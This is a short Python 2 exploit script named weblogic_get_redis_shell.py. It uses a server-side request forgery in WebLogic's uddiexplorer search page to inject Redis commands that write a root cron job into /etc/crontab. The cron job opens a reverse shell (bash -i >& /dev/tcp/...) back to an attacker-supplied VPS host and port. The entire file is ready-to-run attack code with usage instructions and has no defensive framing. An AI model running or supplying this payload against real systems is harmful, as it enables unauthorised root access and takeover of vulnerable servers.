#!/usr/bin/env python  
# -*- coding: utf-8 -*-
#author:Jyanger 
import sys
import requests
import time

def shell(url1,port1,url2,port2):
	exp_url = "http://192.168.187.144:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{}:{}/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa".format(url1,port1,url2,port2)
	try:
		response = requests.get(exp_url,timeout=5,verify=False)
		print "[+]please wait a monment"
		time.sleep(3)
		print "[+]Then check you vps if or not get a rebound shell!"
	
	except Exception,e:
		print e
		print "[-]maybe Rebound shell failed!"

if __name__=="__main__":
	if len(sys.argv)!= 5:
		print "usage: python weblogic_get_redis_shell.py [rip] [rport(6379)] [vpsip] [vpsport]"
	else:
		shell(sys.argv[1],int(sys.argv[2]),sys.argv[3],int(sys.argv[4]))
